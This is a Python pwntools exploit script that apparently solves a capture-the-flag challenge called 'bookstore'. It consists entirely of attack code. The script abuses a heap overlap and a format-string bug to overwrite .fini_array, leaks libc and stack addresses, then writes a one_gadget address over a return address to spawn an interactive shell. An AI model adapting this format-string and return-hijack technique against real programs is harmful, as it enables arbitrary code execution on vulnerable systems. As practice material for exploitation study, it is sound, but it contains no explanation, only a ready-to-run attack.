from pwn import *

io = process('./bookstore')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def edit(idx, cont):
	io.sendlineafter("Submit\n", str(idx))
	io.sendlineafter("order:\n", cont)

def delete(idx):
	io.sendlineafter("Submit\n", str(idx+2))

def submit(cont):
	io.sendlineafter("Submit\n", '5'*8+cont)

def leak():
	global libc_base, ret_addr

	delete(2)
	payload  = '%'+str(0xa39)+'c%13$hn' + '%31$p%33$p'	# main_addr = 0x400a39
	payload  = payload.ljust(0x74, 'A').ljust(0x80, '\x00')	# 0x74 = 0x90 - 28
	payload += p64(0) + p64(0x151)
	edit(1, payload)

	submit(p64(0x6011b8))					# .fini_array
	io.recvuntil("0x")
	leak_addr1 = int(io.recv(12), 16)		# <__libc_start_main+0xf0>
	libc_base = leak_addr1 - 0xf0 - libc.symbols['__libc_start_main']
	io.recvuntil("0x")
	leak_addr2 = int(io.recv(12), 16)		# stack -> "./bookstore"
	ret_addr = leak_addr2 - 0x1f0			# _dl_fini()
	log.info("leak_addr1: 0x%x" % leak_addr1)
	log.info("leak_addr2: 0x%x" % leak_addr2)
	log.info("libc_base: 0x%x" % libc_base)
	log.info("ret_addr: 0x%x" % ret_addr)

def pwn():
	one_gadget = libc_base + 0x45216
	part1 = u8(p64(one_gadget)[:1])
	part2 = u16(p64(one_gadget)[1:3])

	delete(2)
	payload  = '%'+str(part1)+'c%13$hhn' + '%'+str(part2-part1)+'c%14$hn'
	payload  = payload.ljust(0x74, 'A').ljust(0x80, '\x00')
	payload += p64(0) + p64(0x151)
	edit(1, payload)

	submit(p64(ret_addr) + p64(ret_addr+1))
	io.recvuntil("Order 2: \n")
	io.recvuntil("Order 2: \n")
	io.interactive()

if __name__=='__main__':
	leak()
	pwn()
